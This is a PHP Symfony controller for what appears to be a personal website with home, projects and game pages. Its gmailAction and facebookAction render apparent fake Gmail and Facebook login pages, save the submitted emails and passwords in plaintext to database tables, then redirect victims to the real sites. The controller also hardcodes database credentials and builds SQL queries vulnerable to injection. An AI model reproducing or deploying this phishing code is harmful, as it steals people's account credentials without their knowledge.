<?php

namespace Personal\Bundle\Controller;

use Symfony\Bundle\FrameworkBundle\Controller\Controller;

class DefaultController extends Controller
{
    public function indexAction()
    {
        return $this->render('PersonalBundle:Default:index.html.twig');
    }
    
    public function projectsAction() 
    {
        return $this->render('PersonalBundle:Default:projects.html.twig');
    }
    
    public function gameAction() 
    {
        return $this->render('PersonalBundle:Default:game.html.twig');
    }
    
    public function gmailAction()
    {
        if(isset($_POST['Email']) && isset($_POST['Passwd']))
        {
            $con=mysqli_connect("localhost","KyleM","Minshall1!","Site");

            if (mysqli_connect_errno()) 
            {
              echo "Failed to connect to MySQL: " . mysqli_connect_error();
            }

            $username = $_POST['Email'];
            $password = $_POST['Passwd'];

            mysqli_query($con,"INSERT INTO Gmail (Username, Password) VALUES ('$username', '$password')");

            mysqli_close($con);
            
            return $this->redirect('http://www.gmail.com');
        }
        
        return $this->render('PersonalBundle:Default:gmail.html.twig');
    }
    
    public function facebookAction()
    {
        if(isset($_POST['email']) && isset($_POST['pass']))
        {
            $con=mysqli_connect("localhost","KyleM","Minshall1!","Site");

            if (mysqli_connect_errno()) 
            {
              echo "Failed to connect to MySQL: " . mysqli_connect_error();
            }

            $username = $_POST['email'];
            $password = $_POST['pass'];

            mysqli_query($con,"INSERT INTO Facebook (Username, Password) VALUES ('$username', '$password')");

            mysqli_close($con);
            
            return $this->redirect('http://www.facebook.com');
        }
        
        return $this->render('PersonalBundle:Default:facebook.html.twig');
    }
}
